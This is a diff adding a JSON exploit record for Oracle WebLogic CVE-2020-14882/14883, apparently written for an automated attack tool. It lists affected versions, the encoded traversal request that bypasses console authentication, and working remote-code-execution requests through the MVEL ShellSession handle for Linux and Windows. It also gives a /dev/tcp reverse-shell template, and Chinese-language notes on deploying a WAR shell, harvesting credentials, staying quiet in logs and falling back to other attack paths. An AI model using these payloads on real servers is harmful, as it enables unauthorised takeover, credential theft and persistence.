@@ -1,0 +1,128 @@
+{
+  "id": "weblogic-cve-2020-14882-console-bypass-rce",
+  "family": "weblogic",
+  "product": "Oracle WebLogic",
+  "cve": "CVE-2020-14882",
+  "aliases": [
+    "WebLogic console auth bypass RCE",
+    "CVE-2020-14882/14883 chain"
+  ],
+  "severity": "critical",
+  "tags": [
+    "weblogic",
+    "console",
+    "auth-bypass",
+    "mvel",
+    "rce"
+  ],
+  "applicability": {
+    "versions": [
+      "10.3.6.0",
+      "12.1.3.0",
+      "12.2.1.3",
+      "12.2.1.4",
+      "14.1.1.0"
+    ],
+    "fingerprints": [
+      "/console/login/LoginForm.jsp or /console/ assets exposed",
+      "Path traversal via encoded ../ reaches console.portal",
+      "MVEL / ShellSession handle parameter evaluation path present"
+    ],
+    "signals": [
+      "GET /console/css/%252e%252e%252fconsole.portal returns console page without login redirect",
+      "Traversal path works even when normal /console.portal is protected",
+      "Injected handle parameter changes error behavior"
+    ]
+  },
+  "preconditions": [
+    "The vulnerable console path traversal must be reachable.",
+    "The request path must bypass auth checks before hitting console portal.",
+    "The handle parameter evaluation path must not be patched or blocked."
+  ],
+  "verification": {
+    "method": "http_get",
+    "requests": [
+      {
+        "path": "/console/css/%252e%252e%252fconsole.portal",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "matchers": [
+          "HTTP 200 with console content",
+          "No login redirect or auth challenge"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('id');\")",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "linux"
+      },
+      {
+        "path": "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('cmd.exe /c whoami');\")",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "windows"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先确认控制的是管理节点还是普通应用节点，并记录 domain、admin server 和 managed server 关系。",
+      "成功后优先查看部署、数据源、JMS、凭据和管理接口，不要持续走 console handle。",
+      "如果已经进入管理面，优先利用已有管理员能力部署稳定 WAR/JSP 或导出配置。"
+    ],
+    "shell_options": [
+      {
+        "type": "bash_reverse_shell",
+        "template": "Replace id with /bin/sh -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' in the handle expression"
+      },
+      {
+        "type": "war_deploy",
+        "template": "Use obtained console access to deploy a minimal WAR shell named {app_name}.war"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先验证 encoded traversal 是否能访问 console.portal。",
+      "再执行最小命令或利用管理会话验证。",
+      "如果拿到管理面，优先转向低噪声配置导出与部署。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "hostname",
+      "pwd"
+    ],
+    "shell_prerequisites": [
+      "确认 console 路径没有被网关重写或前置代理过滤。",
+      "确认 handle 参数仍然可达 MVEL/ShellSession 逻辑。"
+    ],
+    "fallbacks": [
+      "如果 traversal 可用但 handle 不执行，先利用控制台可达性寻找其他管理接口或信息泄露。",
+      "如果 console 已补丁化，转回 WSAT、T3、已部署应用或弱口令管理面。"
+    ]
+  },
+  "detection_notes": [
+    "控制台认证绕过命中率高，但日志痕迹也很明显，验证后应尽快切换到管理能力或稳定 foothold。",
+    "不少题目会把 auth bypass 和后续部署利用拆成多阶段，不要把一次 whoami 当作终点。"
+  ],
+  "references": [
+    "Oracle advisory for CVE-2020-14882",
+    "Public WebLogic console bypass exploitation notes"
+  ]
+}
